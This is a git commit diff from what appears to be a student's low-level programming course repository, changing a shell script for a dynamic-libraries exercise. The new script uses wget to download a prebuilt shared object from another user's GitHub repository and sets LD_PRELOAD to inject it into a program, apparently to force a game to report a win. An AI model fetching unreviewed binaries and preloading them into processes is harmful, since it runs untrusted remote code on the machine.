3dc2a4bc6ebe4c0b0e3222506194e4ddc72cd213
Max01-Z <mwendamarx@gmail.com>
2022-06-18 00:21:00 +0300

    update

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
- wget -P /tmp https://github.com/Max01-Z/alx-low_level_programming/blob/main/0x18-dynamic_libraries/101-make_me_win.sh
- export LD_PRELOAD=/tmp/libmask.so
- 
+wget https://github.com/svelezg/holbertonschool-low_level_programming/raw/master/0x18-dynamic_libraries/inject.so -P ../
+export LD_PRELOAD=../inject.so
